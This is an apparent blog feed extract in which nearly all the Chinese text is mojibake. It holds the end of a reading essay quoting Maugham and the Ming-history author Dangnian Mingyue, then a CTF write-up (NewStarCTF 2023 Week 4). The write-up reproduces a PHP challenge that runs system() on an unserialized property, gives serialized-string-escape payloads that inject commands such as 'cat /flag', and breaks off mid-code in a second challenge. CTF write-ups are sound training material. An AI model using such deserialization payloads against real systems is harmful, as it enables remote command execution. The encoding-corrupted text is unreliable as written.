æ‰€æ±‚ã€‚ä»–ä¸ºäººå¤ªè°¦è™šäº†ï¼Œå†³ä¸è‚¯ä½¿è‡ªå·±æˆä¸ºåˆ«äººçš„è¡¨ç‡ï¼›ä½†æ˜¯ï¼Œä»–ä¹Ÿè®¸ä¼šæƒ³åˆ°ï¼Œä¸€äº›è¯´ä¸ä¸Šæ¥çš„äººä¼šè±¡é£è›¾æ‰‘ç¯ä¸€æ ·è¢«å¸å¼•åˆ°ä»–èº«è¾¹æ¥ï¼Œå¹¶ä¸”é€æ¸å’Œä»–çš„çƒ­çƒˆä¿¡ä»°å–å¾—ä¸€è‡´ï¼Œè®¤ä¸ºäººç”Ÿæœ€å¤§çš„æ»¡è¶³åªèƒ½é€šè¿‡ç²¾ç¥ç”Ÿæ´»æ¥ä½“ç°ï¼Œè€Œä»–æœ¬äººå§‹ç»ˆæŠ±ç€æ— æˆ‘å’Œæ— æ±‚çš„æ€åº¦ï¼Œèµ°ç€ä¸€æ¡é€šå¾€è‡ªæˆ‘å®Œå–„çš„é“è·¯ï¼Œå°†ä¼šä½œå‡ºè‡ªå·±çš„è´¡çŒ®ï¼Œå°±å¦‚åŒè‘—ä¹¦ç«‹è¯´æˆ–è€…å‘å¹¿å¤§ç¾¤ä¼—å‘è¡¨æ¼”è®²ä¸€æ ·ã€‚<br>ä½†æ˜¯è¿™éƒ½æ˜¯æ£æµ‹ä¹‹è¾ã€‚æˆ‘æ˜¯ä¸ªä¿—äººï¼Œæ˜¯å°˜ä¸–ä¸­äººï¼›æˆ‘åªèƒ½å¯¹è¿™ç±»äººä¸­éºŸå‡¤çš„å…‰è¾‰å½¢è±¡è¡¨ç¤ºæ™¯æ…•ï¼Œæ²¡æ³•æ­¥ä»–çš„åå°˜ã€‚æœ‰æ—¶å€™ä¸€äº›æ¯”è¾ƒæ¥è¿‘é€šå¸¸ç±»å‹çš„äººï¼Œæˆ‘è‡ªå‘½èƒ½äº†è§£ä»–ä»¬çš„å†…å¿ƒæ·±å¤„ï¼›å¯¹æ‹‰é‡Œï¼Œæˆ‘ä¸èƒ½ã€‚æ‹‰é‡Œå·²ç»å¦‚ä»–è‡ªæ„¿çš„é‚£æ ·ï¼Œè—èº«åœ¨é‚£ç‰‡å–§åš£æ¿€è¡çš„äººæµ·ä¸­äº†ï¼›è€Œè¿™ç‰‡äººæµ·åˆæ˜¯è¢«é‚£ä¹ˆå¤šçš„çŸ›ç›¾åˆ©ç›Šå›°æ‰°ç€ï¼Œé‚£æ ·è¿·å¤±åœ¨ä¸–ç•Œçš„æ··ä¹±é‡Œï¼Œé‚£æ ·æ¸´æœ›å¥½çš„ï¼Œé‚£æ ·å¤–è¡¨ä¸Šç¬ƒå®šï¼Œå†…å¿ƒé‡Œå½·å¾¨ï¼Œé‚£æ ·æ…ˆå–„ï¼Œé‚£æ ·æ®‹å¿ï¼Œé‚£æ ·è¯šå®ï¼Œåˆé‚£æ ·ç‹¡çŒ¾ï¼Œé‚£æ ·å‘é„™ï¼Œåˆé‚£æ ·æ…·æ…¨ï¼›è€Œè¿™å°±æ˜¯ç¾å›½äººæ°‘ã€‚æˆ‘è®²æ‹‰é‡Œåªèƒ½åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘çŸ¥é“è¿™å¾ˆä¸å¤Ÿï¼Œä½†æ˜¯ï¼Œæ²¡æœ‰åŠæ³•ã€‚å¯æ˜¯ï¼Œå½“æˆ‘å†™å®Œè¿™æœ¬ä¹¦ï¼Œæ„Ÿåˆ°å‡†ä¼šä½¿è¯»è€…æ‘¸ä¸åˆ°è¾¹é™…è€Œæœ‰ç‚¹ä¸è‡ªåœ¨æ—¶ï¼Œæˆ‘å°±æŠŠè¿™å†—é•¿çš„æ•…äº‹åœ¨è„‘å­é‡Œé‡æ¸©äº†ä¸€éï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰åŠæ³•è®¾è®¡ä¸€ä¸ªä»¤äººæ»¡æ„ä¸€ç‚¹çš„ç»“å±€ã€‚ä½¿æˆ‘éå¸¸åƒæƒŠçš„æ˜¯ï¼Œæˆ‘å¿½ç„¶ææ‚Ÿï¼Œå°½ç®¡ä¸æ¯«æ²¡æœ‰æ„æ€è¦è¿™æ ·åšï¼Œæˆ‘ä¸å¤šä¸å°‘æ°æ°å†™äº†ä¸€éƒ¨ä»¥â€œæˆåŠŸâ€ä¸ºé¢˜æçš„å°è¯´ã€‚<br>å› ä¸ºä¹¦ä¸­å’Œæˆ‘æœ‰å…³çš„äººç‰©æ— ä¸å¦‚æ„¿ä»¥å¿ï¼šè‰¾ç•¥ç‰¹æˆä¸ºç¤¾äº¤ç•Œåæµï¼›ä¼Šèè´å„¿åœ¨ä¸€ä¸ªæ´»è·ƒè€Œæœ‰æ–‡åŒ–çš„ç¤¾ä¼šé‡Œå–å¾—å·©å›ºåœ°ä½ï¼Œå¹¶ä¸”æœ‰ä¸€ç¬”è´¢äº§åšé å±±ï¼›æ ¼é›·æ‰¾åˆ°ä¸€ä¸ªç¨³å®šè€Œèµšé’±çš„èŒä¸šå¯ä»¥æ¯å¤©ä»æ—©ä¸Šä¹ç‚¹åˆ°ä¸‹åˆå…­ç‚¹ä¸Šç­ï¼›è‹å§—?é²ç»´åŸƒå¾—åˆ°ç”Ÿæ´»ä¿éšœï¼›ç´¢è²è·å¾—æ­»äº¡ï¼›æ‹‰é‡Œæ‰¾åˆ°äº†å®‰èº«ç«‹å‘½ä¹‹é“ã€‚æ‰€ä»¥ï¼Œä¸ç®¡é‚£äº›è‡ªå‘½é£é›…çš„äººå¤šä¹ˆæŒ‘å‰”ï¼Œä¸€èˆ¬å…¬ä¼—ä»å¿ƒçœ¼é‡Œè¿˜æ˜¯å–œæ¬¢ä¸€éƒ¨å¦‚æ„¿ä»¥å¿çš„å°è¯´çš„ï¼›æ‰€ä»¥ï¼Œä¹Ÿè®¸æˆ‘çš„æ•…äº‹ç»“å±€æ¯•ç«Ÿå¹¶ä¸æ˜¯æ€æ ·ä¸å¦‚äººæ„å‘¢ã€‚</p></blockquote><p>â€‹å…¶å®å†™è¿™ä¸œè¥¿æˆ‘ç£¨è¹­äº†å¾ˆä¹…ï¼Œä¸€æ˜¯è„‘å­é‡Œç¡®å®æ²¡å•¥ä¸œè¥¿ï¼Œä¸çŸ¥é“å†™å•¥&#x2F;å†™å‡ºæ¥çš„ä¸œè¥¿æˆ‘è‡ªå·±ä¸æ»¡æ„ã€‚äºŒæ˜¯ä¸€ç›´æ‡’å¾—åŠ¨ç¬”(åŠ¨é”®ç›˜)ã€‚ã€‚</p><p>â€‹æˆ‘å¾ˆå–œæ¬¢&lt;æ˜æœé‚£äº›äº‹å„¿&gt;ï¼Œå°±å·ç‚¹å½“å¹´æ˜æœˆçš„ä¸œè¥¿åšç»“å°¾å§ï¼š</p><blockquote><p>â€‹ä»ä¿—ä¸–çš„è§’åº¦ï¼Œå¾å®ç¥–æ˜¯ä¸ªæ€ªäººï¼Œè¿™äººä¸è€ƒåŠŸåï¼Œä¸æ±‚åšå®˜ï¼Œä¸æˆå®¶ç«‹ä¸šï¼ŒæŒ‰å¾ˆå¤šäººçš„è¯´æ³•ï¼Œæ˜¯æ¯äº†ã€‚</p><p>ã€€ã€€æˆ‘çŸ¥é“ï¼Œå¾ˆå¤šäººè¿˜ä¼šè¯´ï¼Œè¿™ç§ç”Ÿæ´»è’è°¬ï¼Œæ˜¯ä¸ç¬¦åˆå¸¸è§„çš„ï¼Œæ˜¯ä¸æ­£å¸¸çš„ï¼Œæ˜¯ç¼ºæ ¹å¼¦çš„ï¼Œæ˜¯ç²¾ç¥æœ‰é—®é¢˜çš„ã€‚</p><p>ã€€ã€€æˆ‘è®¤ä¸ºï¼Œè¯´è¿™äº›è¯çš„äººï¼Œæ˜¯åƒé¥±äº†ï¼Œæ’‘çš„ï¼Œäººåªæ´»ä¸€è¾ˆå­ï¼Œå¦‚ä½•ç”Ÿæ´»ï¼Œéƒ½æ˜¯è‡ªå·±çš„äº‹ï¼Œè‡ªå·±è¿™è¾ˆå­æµ‘æµ‘å™©å™©åœ°æ²¡æ´»å¥½ï¼Œåšç€è„¸çš®è¿˜æ¥æŒ‡è´£åˆ«äººï¼Œæœ‰å¤šè¿œï¼Œå°±æ»šå¤šè¿œã€‚</p><p>ã€€ã€€æ­¤å‰ï¼Œæˆ‘è®²è¿‡å¾ˆå¤šä¸œè¥¿ï¼Œå¾ˆå¤šå…´è¡°èµ·è½ã€å¾ˆå¤šç‹ä¾¯å°†ç›¸ã€å¾ˆå¤šæ— å¥ˆæ›´æ›¿ï¼Œå¾ˆå¤šé£äº‘å˜å¹»ï¼Œä½†è¿™ä»¶ä¸œè¥¿ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºï¼Œæ˜¯æœ€é‡è¦çš„ã€‚</p><p>ã€€ã€€å› ä¸ºæˆ‘è¦å‘Šè¯‰ä½ ï¼Œæ‰€è°“åƒç§‹éœ¸ä¸šï¼Œä¸‡å¤æµèŠ³ï¼Œä»¥åŠä¸€åˆ‡çš„ä¸€åˆ‡ï¼Œåªæ˜¯ç²ªåœŸã€‚å…ˆå˜æˆç²ªï¼Œå†å˜æˆåœŸã€‚</p><p>ã€€ã€€ç°åœ¨ä½ ä¸æ˜ç™½ï¼Œå°†æ¥ä½ ä¼šæ˜ç™½ï¼Œå°†æ¥ä¸æ˜ç™½ï¼Œå°±å†ç­‰å°†æ¥ï¼Œå¦‚æœä¸€è¾ˆå­éƒ½ä¸æ˜ç™½ï¼Œä¹Ÿè¡Œã€‚</p><p>ã€€ã€€è€Œæœ€åè®²è¿°çš„è¿™ä»¶ä¸œè¥¿ï¼Œå®ƒè¶…è¶Šä¸Šè¿°çš„ä¸€åˆ‡ï¼Œè‡³å°‘åœ¨æˆ‘çœ‹æ¥ã€‚</p><p>ã€€ã€€ä½†è¿™ä»¶ä¸œè¥¿ï¼Œæˆ‘æƒ³äº†å¾ˆä¹…ï¼Œä¹Ÿæ— æ³•ç”¨å‡†ç¡®çš„è¯­è¨€ï¼Œæˆ–æ˜¯è¯å¥æ¥è¡¨è¾¾ï¼Œç”¨æœ€æ¬ æçš„è¯è¯´ï¼Œæ˜¯åªå¯æ„ä¼šï¼Œä¸å¯è¨€ä¼ ã€‚</p><p>ã€€ã€€ç„¶è€Œæˆ‘ç»ˆç©¶æ˜¯ä¸æ¬ æçš„ï¼Œåœ¨éé˜…ç¾¤ä¹¦ï¼Œå´æ— ä»å¼€å£ä¹‹åï¼Œæˆ‘ç»ˆäºä»ä¸€æœ¬ä¸èµ·çœ¼ï¼Œä¸”æ— ç”šä»·å€¼çš„è¯»ç‰©ä¸Šï¼Œæ‰¾åˆ°äº†è¿™å¥é€‚åˆçš„è¯ã€‚</p><p>ã€€ã€€è¿™æ˜¯ä¸€æœ¬å°å†ï¼Œä¸€æœ¬æ”¾åœ¨æˆ‘é¢å‰ï¼Œä¸çŸ¥è¿‡äº†å¤šä¹…ï¼Œå´ä»æœªç¿»è¿‡ï¼Œæ—©å·²è¿‡æœŸçš„å°å†ã€‚</p><p>ã€€ã€€æˆ‘çŸ¥é“ï¼Œæ˜¯ä¸Šå¤©æŠŠè¿™æœ¬å°å†æ”¾åœ¨äº†æˆ‘çš„æ¡Œå‰ï¼Œå®ƒçœ‹ç€å‡ å¹´æ¥æˆ‘æ¯å¤©çš„åŠªåŠ›ï¼Œå§‹ç»ˆçš„åšæŒï¼Œå®ƒé™é™åœ°ï¼Œè€å¿ƒåœ°ç­‰å¾…ç€ç»ˆç»“ã€‚</p><p>ã€€ã€€å®ƒç­‰å¾…ç€ï¼Œåœ¨å³å°†ç»“æŸçš„é‚£ä¸€å¤©ï¼Œæˆ‘å°†ç¿»å¼€è¿™æœ¬é™ªä¼´æˆ‘å§‹ç»ˆï¼Œå´å§‹ç»ˆæœªæ›¾ç¿»å¼€çš„å°å†ï¼Œåœ¨ä¸Šé¢ï¼Œæœ‰ç€æœ€åçš„ç­”æ¡ˆã€‚</p><p>ã€€ã€€æˆ‘ç¿»å¼€äº†å®ƒï¼Œåœ¨è¿™æœ¬å°å†ä¸Šï¼Œå†™ç€ä¸€å¥è¿åäººæ˜¯è°éƒ½æ²¡è¯´æ˜ç™½çš„åäººåè¨€ã€‚</p><p>ã€€ã€€æ˜¯çš„ï¼Œè¿™å°±æ˜¯æˆ‘æƒ³è¯´çš„ï¼Œè¿™å°±æ˜¯æˆ‘æƒ³é€šè¿‡å¾éœå®¢æ‰€è¡¨è¾¾çš„ï¼Œè¶³ä»¥è—è§†æ‰€æœ‰ç‹ä¾¯å°†ç›¸ï¼Œæœ€å®Œç¾çš„ç»“æŸè¯­ï¼š</p><p>ã€€ã€€æˆåŠŸåªæœ‰ä¸€ä¸ªâ€”â€”æŒ‰ç…§è‡ªå·±çš„æ–¹å¼ï¼Œå»åº¦è¿‡äººç”Ÿã€‚</p><p>ã€€ã€€å¾ˆå¤šäººé—®ï¼Œä¸ºä»€ä¹ˆçœ‹å†å²ï¼Œå¾ˆå¤šäººå›ç­”ï¼Œä»¥å²ä¸ºé‰´ã€‚</p><p>ã€€ã€€ç°åœ¨æˆ‘æ¥å‘Šè¯‰ä½ ï¼Œä»¥å²ä¸ºé‰´ï¼Œæ˜¯ä¸å¯èƒ½çš„ã€‚</p><p>ã€€ã€€å› ä¸ºæˆ‘å‘ç°ï¼Œå…¶å®å†å²æ²¡æœ‰å˜åŒ–ï¼ŒæŠ€æœ¯å˜äº†ï¼Œè¡£æœå˜äº†ï¼Œé¥®é£Ÿå˜äº†ï¼Œè¿™éƒ½æ˜¯å¤–å£³ï¼Œé‡Œé¢ä»€ä¹ˆéƒ½æ²¡å˜åŒ–ï¼Œè¿˜æ˜¯å‡ åƒå¹´å‰é‚£ä¸€å¥—ï¼Œè½¬æ¥è½¬å»ï¼Œè¯¥çŠ¯çš„é”™è¯¯è¿˜æ˜¯è¦çŠ¯ï¼Œè¯¥æ€çš„äººè¿˜æ˜¯è¦æ€ï¼Œå²³é£ä¼šæ­»ï¼Œè¢å´‡ç„•ä¼šæ­»ï¼Œå†è¿‡ä¸€åƒå¹´ï¼Œè¿˜æ˜¯ä¼šæ­»ã€‚</p><p>â€‹æ‰€æœ‰å‘ç”Ÿçš„ï¼Œæ˜¯å› ä¸ºå®ƒæœ‰å‘ç”Ÿçš„ç†ç”±ï¼Œèƒ½è¶…è¶Šå†å²çš„äººï¼Œæ‰å«ä»¥å²ä¸ºé‰´ï¼Œç„¶è€Œæˆ‘ä»¬ç»ˆç©¶ä¸èƒ½è¶…è¶Šï¼Œå› ä¸ºæˆ‘ä»¬è‡ªå·±çš„æ¬²æœ›å’Œå¼±ç‚¹ã€‚</p><p>ã€€ã€€æ‰€æœ‰çš„é”™è¯¯ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ï¼Œç„¶è€Œç»ˆç©¶æ”¹ä¸æ‰ã€‚</p><p>ã€€ã€€èƒ½æ”¹çš„ï¼Œå«åšç¼ºç‚¹ï¼Œä¸èƒ½æ”¹çš„ï¼Œå«åšå¼±ç‚¹ã€‚</p><p>ã€€ã€€é¡ºä¾¿è¯´ä¸‹ï¼Œèƒ½è¶…è¶Šå†å²çš„äººï¼Œè¿˜æ˜¯æœ‰çš„ï¼Œæˆ‘ä»¬ç®¡è¿™ç§äººï¼Œå«åšåœ£äººã€‚</p><p>ã€€ã€€ä»¥ä¸Šçš„è¯ï¼Œèƒ½çœ‹æ‡‚çš„ï¼Œå°±çœ‹æ‡‚äº†ï¼Œæ²¡çœ‹æ‡‚çš„ï¼Œå°±å½“æ˜¯è¯´ç–¯è¯ã€‚</p><p>ã€€ã€€æœ€åï¼Œè¯´è¯´æˆ‘è‡ªå·±çš„æƒ³æ³•ã€‚</p><p>ã€€ã€€å› ä¸ºçœ‹å¾—å†å²æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥æˆ‘è¿™ä¸ªäººæ¯”è¾ƒæœ‰å†å²æ„Ÿï¼Œå½“ç„¶ï¼Œè¿™æ˜¯æ–‡æ˜çš„è¯´æ³•ï¼Œç²—ç‚¹è®²ï¼Œå°±æ˜¯æ‚²è§‚ã€‚</p><p>ã€€ã€€è¿™å¹¶éå¼€ç©ç¬‘ï¼Œæˆ‘æœ¬äººè™½ç„¶ç»å¸¸å¹½é»˜å¹½é»˜ï¼Œä½†å¯¹å¾ˆå¤šäº‹æƒ…éƒ½å¾ˆæ‚²è§‚ï¼Œå› ä¸ºæˆ‘ç»å¸¸çœ‹å†å²ï¼ˆå°±å¥½æ¯”å¾ˆå¤šäººçœ‹ç”µè§†å‰§ä¸€æ ·ï¼‰ï¼Œä¸åŒçš„æ˜¯ï¼Œæˆ‘çœ‹åˆ°çš„é‚£äº›å¤æ–‡ä¸­ï¼Œåªæœ‰æ‚²å‰§ç»“å±€ï¼Œæ— ä¸€ä¾‹å¤–ã€‚</p><p>ã€€ã€€æ¯ä¸€ä¸ªäººï¼Œä»–çš„é£é»„è…¾è¾¾å’Œä»–çš„æ²¡è½ï¼Œå¯¹ä»–æœ¬äººè€Œè¨€ï¼Œæ˜¯å‡ åå¹´ï¼Œè€Œå¯¹æˆ‘è€Œè¨€ï¼Œåªæœ‰å‡ é¡µï¼Œå‰ä¸€é¡µä»–å¾ˆç‰›ï¼Œåä¸€é¡µå°±æ€‚äº†ã€‚</p><p>ã€€ã€€ç‹æœä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p><p>ã€€ã€€çœŸæ²¡æ„æ€ï¼Œæ²¡æ„æ€é€äº†ã€‚</p><p>ã€€ã€€ä½†æˆ‘åšæŒå¹½é»˜ï¼Œæ˜¯å› ä¸ºæˆ‘æ˜ç™½ï¼Œæ— è®ºè¿™ä¸ªä¸–ç•Œæœ‰å¤šç»æœ›ï¼Œä½ è‡ªå·±éƒ½è¦å……æ»¡å¸Œæœ›ã€‚</p><p>â€‹äººç”Ÿå¹¶éå¦‚æŸäº›äººæ‰€è¯´ï¼Œå¾ˆçŸ­æš‚ï¼Œäº‹å®ä¸Šï¼Œæœ‰æ—¶å€™ï¼Œå®ƒå¾ˆæ¼«é•¿ï¼Œç‰¹åˆ«æ˜¯å¯¹è‹¦éš¾ä¸­çš„äººï¼Œæ¼«é•¿å¾—æƒ³æ­»ã€‚</p><p>ã€€ã€€ä½†æˆ‘åšæŒï¼Œæ— è®ºæœ‰å¤šç»æœ›ï¼Œæ— è®ºæœ‰å¤šæ‚²å“€ï¼Œæ¯å¤©æ—©ä¸Šèµ·æ¥ï¼Œéƒ½è¦å¯¹è‡ªå·±è¯´ï¼Œè¿™ä¸ªä¸–ç•Œå¾ˆå¥½ï¼Œå¾ˆå¼ºå¤§ã€‚</p><p>ã€€ã€€è¿™å¥è¯ï¼Œä¸æ˜¯åœ¨æ»¡æ€€å¸Œæœ›å…‰æ˜æ—¶è¯´çš„ï¼Œå¾ˆç»æœ›ã€å¾ˆæ— åŠ©ï¼Œå¾ˆç—›è‹¦ï¼Œå¾ˆè¿·èŒ«çš„æ—¶å€™ï¼Œè¯´è¿™å¥è¯ã€‚</p><p>ã€€ã€€è¦åšä¿¡ï¼Œä½ æ˜¯ä¸€ä¸ªå‹‡æ•¢çš„äººã€‚</p><p>ã€€ã€€å› ä¸ºä½ è¿˜æ´»ç€ï¼Œæ´»ç€ï¼Œå°±è¦ç»§ç»­å‰è¿›ã€‚<br>        æˆ‘ä¹‹æ‰€ä»¥å†™å¾éœå®¢ï¼Œæ˜¯æƒ³å‘Šè¯‰ä½ ï¼Œæ‰€è°“ç™¾å¹´åŠŸåã€åƒç§‹éœ¸ä¸šã€ä¸‡å¤æµèŠ³ï¼Œä¸ä¸€ä»¶äº‹æƒ…ç›¸æ¯”ï¼Œå…¶å®ç®—ä¸äº†ä»€ä¹ˆã€‚è¿™ä»¶äº‹æƒ…å°±æ˜¯â€”â€”ç”¨ä½ å–œæ¬¢çš„æ–¹å¼åº¦è¿‡ä¸€ç”Ÿã€‚</p><p>â€‹äººä»…æ­¤ä¸€ç”Ÿï¼Œäººç”Ÿä»…æ¯”ä¸€æ¬¡ï¼Œæ‰€ä»¥â€œæ´»å‡ºè‡ªæˆ‘â€æœ€ä¸ºç´§è¦ã€‚</p><p>â€‹ä½ çœ‹æ•´ä¸ªæ˜æœï¼Œæ— è®ºæ˜¯æœ±å…ƒéšœã€æœ±æ££ã€æœ±ç”±æ£€è¿˜æ˜¯å¼ å±…æ­£ã€å¾é˜¶ã€ç‹é˜³æ˜ï¼Œä»–ä»¬éƒ½æ˜¯è¢«æ—¶ä»€è£¹æŒŸç€å¾€å‰èµ°ï¼Œæˆ–è®¸ä»–ä»¬åœ¨æ”¿æ²»ä¸Šã€æ€æƒ³ä¸Šå æ®é¡¶å³°ï¼Œä¿¾å€ªä¸€åˆ‡ï¼Œå¯æ˜¯åœ¨ä»–ä»¬çš„æ¼«æ¼«äººç”Ÿä¸­ï¼Œæ˜¯å¦æœ‰çœŸæ­£çš„å¿«ä¹å‘¢ï¼Ÿ</p><p>â€‹è‡³å°‘ï¼Œå¾éœå®¢æ˜¯çœŸæ­£çš„å¿«ä¹ã€‚</p><p>â€‹å½“åŒæœçš„å…¶ä»–äººåœ¨è¿½é€å¯Œè´µä¸åŠŸåæ—¶ï¼Œå¾éœå®¢å´ååœ¨äº†é»„å±±ç»é¡¶ï¼Œå¬äº†ä¸€æ•´å¤©çš„å¤§é›ªèåŒ–å£°ã€‚</p></blockquote><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="â€œåˆå››æ—¥ï¼Œå…€åå¬é›ªæºœç«Ÿæ—¥ã€‚â€"><a href="#â€œåˆå››æ—¥ï¼Œå…€åå¬é›ªæºœç«Ÿæ—¥ã€‚â€" class="headerlink" title="â€œåˆå››æ—¥ï¼Œå…€åå¬é›ªæºœç«Ÿæ—¥ã€‚â€"></a><strong>â€œåˆå››æ—¥ï¼Œå…€åå¬é›ªæºœç«Ÿæ—¥ã€‚â€</strong></h3><p>â€‹    </p><p>å‚è€ƒèµ„æ–™ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>.<span class="hljs-selector-attr">[è‹±]</span> å¨å»‰Â·è‰¾é»˜å¡ç‰¹Â·æ¯›å§†, &lt;åˆ€é”‹&gt; æè¾‰ è¯‘<br><span class="hljs-number">2</span>.<span class="hljs-selector-attr">[ç¾]</span> æµ·æ˜å¨, &lt;è€äººä¸æµ·&gt; é»„åå®‰ è¯‘<br><span class="hljs-number">3</span>.å½“å¹´æ˜æœˆ, &lt;æ˜æœé‚£äº›äº‹å„¿&gt;<br><span class="hljs-number">4</span>.<span class="hljs-selector-attr">[è‹±]</span> å¨å»‰Â·è‰¾é»˜å¡ç‰¹Â·æ¯›å§†, &lt;æœˆäº®ä¸å…­ä¾¿å£«&gt; å§šé”¦æ¸… è¯‘<br><span class="hljs-number">5</span><span class="hljs-selector-class">.https</span>:<span class="hljs-comment">//www.zhihu.com/question/50555267</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>reading</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week4</title>
    <link href="/2023/11/30/week4-Writeup_2023_NewStarCTF_Week4/"/>
    <url>/2023/11/30/week4-Writeup_2023_NewStarCTF_Week4/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTFç¬¬å››å‘¨ï¼Œèœé¸Ÿçš„wp</p><span id="more"></span><hr><h2 id="é€ƒ"><a href="#é€ƒ" class="headerlink" title="é€ƒ"></a>é€ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bad&quot;</span>,<span class="hljs-string">&quot;good&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-comment">//ç»è¿‡wafåé•¿åº¦åŠ ä¸€</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])))); www-data www-data<br></code></pre></td></tr></table></figure><p>ç®€å•ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œä»£ç é™åˆ¶äº†<code>$cmd</code>çš„å€¼åªèƒ½æ˜¯<code>whoami</code>ï¼Œä¸è¿‡è¾“å…¥çš„<code>$key</code>å¯æ§ï¼ŒåŒæ—¶ç»è¿‡<code>str_replace</code>å<code>bad</code>è¢«æ¢æˆ<code>good</code>ï¼Œä¼šå¾€ååä¸€ä¸ªå­—ç¬¦ã€‚</p><p>æ„é€ <code>&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code>ï¼Œè¿™ä¸œè¥¿é•¿åº¦ä¸€å…±<code>22</code>ï¼Œæ‰€ä»¥è¦æ”¾<code>22</code>ä¸ª<code>bad</code>ã€‚ç»è¿‡<code>waf</code>åè¢«æ›¿æ¢å®ƒåå‡ºå»ã€‚</p><p><code>payload:</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$key</span>=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:2:&quot;</span><span class="hljs-built_in">ls</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/justrun1.png" alt="justrun1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$key</span>=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-built_in">ls</span> /<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/juestrun2.png" alt="juestrun2"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$key</span>=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:9:&quot;</span><span class="hljs-built_in">cat</span> /flag<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;86b29bdb-7b5e-4348-b81e-84953119c4fc&#125;</code></p><h2 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h2><p>é¢˜ç›®æè¿°ï¼šå†å¿«ä¸€ç‚¹æˆ‘å°±èƒ½æ‹¿åˆ°Flagäº†,å¦‚æœDestructèƒ½æ—©ä¸€ç‚¹è§¦å‘å°±å¥½äº†â€¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 